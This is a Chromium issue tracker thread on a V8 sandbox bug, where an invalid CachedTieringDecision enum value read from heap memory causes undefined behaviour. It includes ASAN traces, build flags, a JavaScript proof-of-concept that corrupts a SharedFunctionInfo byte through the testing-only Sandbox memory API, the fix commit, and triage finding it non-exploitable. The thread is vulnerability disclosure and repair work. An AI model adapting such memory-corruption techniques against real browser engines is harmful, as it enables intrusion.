# V8 Sandbox Bypass: UB in ShouldResetInterruptBudgetByICChange because of invalid CachedTieringDecision enum variant

Issue URL: https://issues.chromium.org/issues/390205877
VRP-Reward: BUG
Date: Jan 16, 2025 09:07PM


#### VULNERABILITY DETAILS

It looks like a variant of the `CachedTieringDecision` enum is constructed based on on-heap data, which may lead to an invalid variant being constructed.

The value is read here from the heap:

```
    #2 0x559184b9f972 in unsigned char v8::internal::ReadMaybeUnalignedValue<unsigned char>(unsigned long) src/common/ptr-compr.h:192:12
    #3 0x559184b9f8e4 in unsigned char v8::internal::HeapObject::ReadField<unsigned char>(unsigned long) const requires std::is_arithmetic_v<unsigned char> || std::is_enum_v<unsigned char> ||
 std::is_pointer_v<unsigned char> src/objects/heap-object.h:241:12
    #4 0x559185a32319 in v8::internal::SharedFunctionInfo::flags2() const src/objects/shared-function-info-inl.h:240:1
    #5 0x559189cd4f14 in v8::internal::SharedFunctionInfo::cached_tiering_decision() src/objects/shared-function-info.cc:797:44
    #6 0x55918624e1aa in v8::internal::TieringManager::InterruptBudgetFor(v8::internal::Isolate*, v8::internal::Tagged<v8::internal::JSFunction>, std::__Cr::optional<v8::internal::CodeKind>) 
src/execution/tiering-manager.cc:242:37
    #7 0x559188dbde79 in v8::internal::JSFunction::SetInterruptBudget(v8::internal::Isolate*, v8::internal::BudgetModification, std::__Cr::optional<v8::internal::CodeKind>) src/objects/js-fun
ction.cc:285:7
    #8 0x559185cd235c in v8::internal::Deoptimizer::DoComputeOutputFrames() src/deoptimizer/deoptimizer.cc:1710:16
    #9 0x559185ccdc74 in v8::internal::Deoptimizer::ComputeOutputFrames(v8::internal::Deoptimizer*) src/deoptimizer/deoptimizer.cc:574:16
    #10 0x5591931742c4 in Builtins_DeoptimizationEntry_Eager setup-isolate-deserialize.cc
    #11 0x55919317f91b in Builtins_JSEntryTrampoline setup-isolate-deserialize.cc
```

#### VERSION

V8 commit: `ab875b6ed878b0b1934ab935366224ee4c761985` (2025-01-15T14:21:08+00:00)

#### REPRODUCTION CASE

Build args:

```
is_debug=false
is_asan=true
v8_enable_sandbox=true
v8_enable_memory_corruption_api=true
dcheck_always_on=false
v8_static_library=true
v8_fuzzilli=false
target_cpu="x64"
```

Shell args: `d8 --fuzzing --sandbox-fuzzing --single-threaded --allow-natives-syntax --expose-gc bug.js`

##### ASAN Report:

```
==111560==ERROR: AddressSanitizer: ILL on unknown address 0x55555df1ba48 (pc 0x55555df1ba48 bp 0x7fffffff6a70 sp 0x7fffffff6a60 T0)
    #0 0x55555df1ba48 in v8::internal::(anonymous namespace)::ShouldResetInterruptBudgetByICChange(v8::internal::CachedTieringDecision) src/execution/tiering-manager.cc:432:3
    #1 0x55555df1ad32 in v8::internal::TieringManager::NotifyICChanged(v8::internal::Tagged<v8::internal::FeedbackVector>) src/execution/tiering-manager.cc:509:9
    #2 0x555560ae0477 in v8::internal::IC::OnFeedbackChanged(v8::internal::Isolate*, v8::internal::Tagged<v8::internal::FeedbackVector>, v8::internal::FeedbackSlot, char const*) src/ic/ic.cc:327:31
    #3 0x555560ae03ef in v8::internal::IC::OnFeedbackChanged(char const*) src/ic/ic.cc:315:3
    #4 0x555560ae13f1 in v8::internal::IC::ConfigureVectorState(v8::internal::DirectHandle<v8::internal::Name>, v8::internal::DirectHandle<v8::internal::Map>, v8::internal::MaybeObjectHandle const&) src/ic/ic.cc:368:3
    #5 0x555560af7142 in v8::internal::IC::UpdateMonomorphicIC(v8::internal::MaybeObjectHandle const&, v8::internal::DirectHandle<v8::internal::Name>) src/ic/ic.cc:722:3
    #6 0x555560af7fda in v8::internal::IC::SetCache(v8::internal::DirectHandle<v8::internal::Name>, v8::internal::MaybeObjectHandle const&) src/ic/ic.cc:762:7
    #7 0x555560aeb557 in v8::internal::LoadIC::UpdateCaches(v8::internal::LookupIterator*) src/ic/ic.cc:833:3
    #8 0x555560ae4bad in v8::internal::LoadIC::Load(v8::internal::Handle<v8::internal::Union<v8::internal::Smi, v8::internal::HeapNumber, v8::internal::BigInt, v8::internal::String, v8::internal::Symbol, v8::internal::Boolean, v8::internal::Null, v8::internal::Undefined, v8::internal::JSReceiver>>, v8::internal::Handle<v8::internal::Name>, bool, v8::internal::DirectHandle<v8::internal::Union<v8::internal::Smi, v8::internal::HeapNumber, v8::internal::BigInt, v8::internal::String, v8::internal::Symbol, v8::internal::Boolean, v8::internal::Null, v8::internal::Undefined, v8::internal::JSReceiver>>) src/ic/ic.cc:448:7
    #9 0x555560b71ede in v8::internal::Runtime_LoadIC_Miss(int, unsigned long*, v8::internal::Isolate*) src/ic/ic.cc:2792:5
    #10 0x55556aee9c35 in Builtins_CEntry_Return1_ArgvOnStack_NoBuiltinExit setup-isolate-deserialize.cc
    #11 0x55556afdea9e in Builtins_GetNamedPropertyHandler setup-isolate-deserialize.cc
    #12 0x55556ae42e40 in Builtins_InterpreterEntryTrampoline setup-isolate-deserialize.cc
    #13 0x55556ae4091b in Builtins_JSEntryTrampoline setup-isolate-deserialize.cc
    #14 0x55556ae4066a in Builtins_JSEntry setup-isolate-deserialize.cc
    #15 0x55555daf5283 in v8::internal::GeneratedCode<unsigned long, unsigned long, unsigned long, unsigned long, unsigned long, long, unsigned long**>::Call(unsigned long, unsigned long, unsigned long, unsigned long, long, unsigned long**) src/execution/simulator.h:191:12
    #16 0x55555dae71e0 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) src/execution/execution.cc:437:22
    #17 0x55555dae8acd in v8::internal::Execution::CallScript(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSFunction>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>) src/execution/execution.cc:537:10
    #18 0x55555c52c654 in v8::Script::Run(v8::Local<v8::Context>, v8::Local<v8::Data>) src/api/api.cc:2156:7
    #19 0x55555c52b06c in v8::Script::Run(v8::Local<v8::Context>) src/api/api.cc:2119:10
    #20 0x55555bf7679a in v8::Shell::ExecuteString(v8::Isolate*, v8::Local<v8::String>, v8::Local<v8::String>, v8::Shell::ReportExceptions, v8::Global<v8::Value>*) src/d8/d8.cc:1018:44
    #21 0x55555c032e16 in v8::SourceGroup::Execute(v8::Isolate*) src/d8/d8.cc:4963:10
    #22 0x55555c0505fa in v8::Shell::RunMainIsolate(v8::Isolate*, bool) src/d8/d8.cc:5907:37
    #23 0x55555c04e514 in v8::Shell::RunMain(v8::Isolate*, bool) src/d8/d8.cc:5816:18
    #24 0x55555c05788b in v8::Shell::Main(int, char**) src/d8/d8.cc:6714:18
    #25 0x55555c059781 in main src/d8/d8.cc:6806:43
    #26 0x7ffff7a211c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #27 0x7ffff7a2128a in __libc_start_main csu/../csu/libc-start.c:360:3
    #28 0x55555bd43029 in _start (/work/v8-build/v8/out/FuzzingSuppressReadsO1/d8+0x67ef029) (BuildId: cbaa25b471887c0f)

## V8 sandbox violation detected!
```

#### CREDIT INFORMATION

Reporter credit: v8sbxfuzz


---

**#2 — cl...@appspot.gserviceaccount.com — Jan 17, 2025 01:27AM**

ClusterFuzz is analyzing your testcase. Developers can follow the progress at [https://clusterfuzz.com/testcase?key=6125744983834624](<https://clusterfuzz.com/testcase?key=6125744983834624>).


---

**#3 — cl...@appspot.gserviceaccount.com — Jan 17, 2025 02:23AM**

ClusterFuzz is analyzing your testcase. Developers can follow the progress at [https://clusterfuzz.com/testcase?key=6109070175961088](<https://clusterfuzz.com/testcase?key=6109070175961088>).


---

**#4 — ti...@chromium.org — Jan 17, 2025 02:53AM**

(primary shepherd)

Clusterfuzz is having trouble reproducing for some reason but I am able to reproduce locally on d8 head and stable. Assigning to the current v8 security shepherd sroettger@


---

**#5 — sr...@google.com — Jan 18, 2025 12:13AM**

Thanks for the report. For some reason, I'm not able to repro at the same commit + gn args.. I'll try harder :).

I filed an umbrella bug for the issue that we're static_cast'ing in-sandbox memory to enums in crbug.com/c/390617721.

We wrote a CodeQL query today that should identify all of these cases (once it finished running).


---

**#6 — v8...@gmail.com — Jan 18, 2025 12:33AM**

I just successfully tested the (update) test case below on commit `b9959a42f73132deff7034dc20d5c1344c722e13`. Unfortunately, I don't know how to get a stable reference to the `SharedFunctionInfo` object, so the test case contains hard-coded constants.

```
let sbx_memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
Sandbox.getAddressOf(sbx_memory);

for (let v0 = 0; v0 < 5; v0++) {
    ("t9e").localeCompare("t9e");
    print();
    print();
    print();
    const v3 = % OptimizeOsr();
    print();
    print();

    start_addr = 0x19c317;
    while (true) {
        let map = sbx_memory.getUint32(start_addr, true);
        let flags2 = sbx_memory.getUint8(start_addr + 31, true);
        // look for the SharedFunctionInfo
        if (map == 0x00000d31 && flags2 == 0x50) {
            print("found: 0x" + start_addr.toString(16));
            break;
        }
        start_addr -= 1;
    }

    // set flags2 of SharedFunctionInfo
    sbx_memory.setUint8(start_addr + 31, 0x70);
}
```


---

**#7 — v8...@gmail.com — Jan 18, 2025 12:36AM**

Setting `start_addr = Sandbox.getAddressOf(this);` and incrementing the address (`start_addr += 1;`) also works for me.


---

**#8 — pe...@google.com — Jan 18, 2025 12:40AM**

Setting milestone because of s2 severity.


---

**#9 — ti...@chromium.org — Jan 18, 2025 02:09AM**

(primary shepherd)

Actually, the error I was seeing locally was not a valid sbx crash so I wasn't able to reproduce this locally either. Even with <https://issues.chromium.org/issues/390205877#comment7> and <https://issues.chromium.org/issues/390205877#comment6> I'm still getting `"found: 0x199b40" Cuaght harmless memory access violation (inside sandbox address space).`


---

**#10 — v8...@gmail.com — Jan 19, 2025 09:35PM**

I saw I had different build settings for the reproduction binary because the submodule did not update. This is the patch I applied to the `build` submodule:

```
diff --git a/config/compiler/BUILD.gn b/config/compiler/BUILD.gn
index 33a232ed7..603a8d28c 100644
--- a/config/compiler/BUILD.gn
+++ b/config/compiler/BUILD.gn
@@ -631,7 +631,7 @@ config("compiler") {
     # TODO(crbug.com/376278218): This causes segfault on Linux ARM builds.
     if (is_linux && !llvm_android_mainline && current_cpu != "arm" &&
         default_toolchain != "//build/toolchain/cros:target") {
-      cflags += [ "-Wa,--crel,--allow-experimental-crel" ]
+      #cflags += [ "-Wa,--crel,--allow-experimental-crel" ]
     }
   }
 
@@ -2662,9 +2662,9 @@ config("optimize_max") {
       # /O2 implies /Ot, /Oi, and /GF.
       cflags = [ "/O2" ] + common_optimize_on_cflags
     } else if (optimize_for_fuzzing) {
-      cflags = [ "-O1" ] + common_optimize_on_cflags
+      cflags = [ "-O0" ] + common_optimize_on_cflags
     } else {
-      cflags = [ "-O2" ] + common_optimize_on_cflags
+      cflags = [ "-O0" ] + common_optimize_on_cflags
     }
     rustflags = [ "-Copt-level=3" ]
   }
@@ -2698,16 +2698,16 @@ config("optimize_speed") {
         cflags += [ "/clang:-O3" ]
       }
     } else if (optimize_for_fuzzing) {
-      cflags = [ "-O1" ] + common_optimize_on_cflags
+      cflags = [ "-O0" ] + common_optimize_on_cflags
     } else {
-      cflags = [ "-O3" ] + common_optimize_on_cflags
+      cflags = [ "-O0" ] + common_optimize_on_cflags
     }
     rustflags = [ "-Copt-level=3" ]
   }
 }
 
 config("optimize_fuzzing") {
-  cflags = [ "-O1" ] + common_optimize_on_cflags
+  cflags = [ "-O0" ] + common_optimize_on_cflags
   rustflags = [ "-Copt-level=1" ]
   ldflags = common_optimize_on_ldflags
   visibility = [ ":default_optimization" ]
```

Without the changed cflags, the reproducer does not work for me either, and I have been unable to get it running again so far. Since this is UB, the bug may only trigger depending on the compiler (flags).


---

**#11 — sr...@google.com — Jan 21, 2025 02:04AM**

Thanks! Yeah, with optimizations enabled, the compiler just turns the code pattern into a `return (value > X)`. I was able to reproduce with -O0.


---

**#12 — ap...@google.com — Jan 21, 2025 02:07AM**

Project: v8/v8  
Branch: main  
Author: Stephen Roettger <[sroettger@google.com](<mailto:sroettger@google.com>)>  
Link: [https://chromium-review.googlesource.com/6179823](<https://chromium-review.googlesource.com/6179823>)

[sandbox] fix UB after switch on CachedTieringDecision enum

* * *

Expand for full commit details

```
[sandbox] fix UB after switch on CachedTieringDecision enum 
 
ShouldResetInterruptBudgetByICChange doesn't have a return after the 
exhaustive switch on the CachedTieringDecision enum. This is UB if the 
enum value can be outside of the range of the declared enum values. 
 
Fixed: 390205877 
Bug: 390617721 
Change-Id: Iec0648067b40f598b86b1b401df9f6e897994859 
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6179823 
Commit-Queue: Stephen Röttger <sroettger@google.com> 
Reviewed-by: Igor Sheludko <ishell@chromium.org> 
Cr-Commit-Position: refs/heads/main@{#98206}
```

* * *

Files:

  * M `src/execution/tiering-manager.cc`

* * *

Hash: 3517e6ced4eddbe54c1d468c91622494190984cc  
Date: Mon Jan 20 17:34:45 2025

* * *


---

**#13 — pe...@google.com — Jan 22, 2025 12:49AM**

Security Merge Request Consideration: This is sufficiently serious that it should be merged to beta. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M133. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately. Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [].

Please answer the following questions so that we can safely process this merge request:

  1. Which CLs should be backmerged? (Please include Gerrit links.)
  2. Has this fix been verified on Canary to not pose any stability regressions?
  3. Does this fix pose any potential non-verifiable stability risks?
  4. Does this fix pose any known compatibility risks?
  5. Does it require manual verification by the test team? If so, please describe required testing.
  6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!


---

**#14 — pe...@google.com — Jan 22, 2025 02:16AM**

Merge review required: M133 is already shipping to beta.

Please answer the following questions so that we can safely process your merge request:

  1. Why does your merge fit within the merge criteria for these milestones?

  * Chrome Browser: [https://chromiumdash.appspot.com/branches](<https://chromiumdash.appspot.com/branches>)
  * Chrome OS: [https://goto.google.com/cros-release-branch-merge-guidelines](<https://goto.google.com/cros-release-branch-merge-guidelines>)

  2. What changes specifically would you like to merge? Please link to Gerrit.
  3. Have the changes been released and tested on canary?
  4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
  5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? [https://goto.google.com/cros-engprodcomponents](<https://goto.google.com/cros-engprodcomponents>)
  6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions. Owners: andywu (ChromeOS), pbommana (Desktop US), danielyip (Desktop EMEA), harrysouders (Mobile US), eakpobaro (Mobile EMEA)


---

**#15 — sr...@google.com — Jan 22, 2025 06:36PM**

> Why does your merge fit within the merge criteria for these milestones?

I don't think it does. This bug is about undefined behavior in our heap sandbox boundary. But I think in pratice, this example is not exploitable, since release builds will optimize this function to a simple if / else and non-optimized builds will just run into an ud2 instruction.

> What changes specifically would you like to merge? Please link to Gerrit.

[https://chromium-review.git.corp.google.com/c/v8/v8/+/6179823](<https://chromium-review.git.corp.google.com/c/v8/v8/+/6179823>)

> Have the changes been released and tested on canary?

It's in 134.0.6971.0

> Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?

No


---

**#16 — pe...@google.com — Jan 22, 2025 06:44PM**

Dear owner, thanks for fixing this bug. We've reopened it because:

  * Security bugs need the Severity (S0-S3) and the Found In set, which will enable the bots to request merges to the correct branches (as well as helping out our vulnerability reward and CVE processes). Please consult with any Chrome security contact ([security@chromium.org](<mailto:security@chromium.org>)) to arrange to set these labels. Severity guidelines: [https://chromium.googlesource.com/chromium/src/+/refs/heads/main/docs/security/severity-guidelines.md#severity-guidelines-for-security-issues](<https://chromium.googlesource.com/chromium/src/+/refs/heads/main/docs/security/severity-guidelines.md#severity-guidelines-for-security-issues>) FoundIn guidelines: [https://chromium.googlesource.com/chromium/src/+/main/docs/security/security-labels.md#labels-relevant-for-any-type_bug_security](<https://chromium.googlesource.com/chromium/src/+/main/docs/security/security-labels.md#labels-relevant-for-any-type_bug_security>) After resolving the above issue(s), this bug can be marked closed again. Thanks for your time!


---

**#17 — am...@chromium.org — Jan 24, 2025 04:54AM**

We don't backmerge fixes for the V8 sandbox since it's not yet considered a security boundary. Also, this being realized to not be potentially exploitable also means we would not backmerge this. If you believe this issue to not be exploitable, please also downgrade to type:bug and S4.


---

**#18 — am...@chromium.org — Jan 30, 2025 07:08AM**

Thank you for the report. Since this issue does not appear to be an exploitable violation of the v8 sandbox, this report is unfortunately not eligible for a Chrome VRP reward.


---

**#19 — ch...@google.com — May 1, 2025 09:44PM**

This bug has been closed for more than 14 weeks. Removing issue access restrictions.
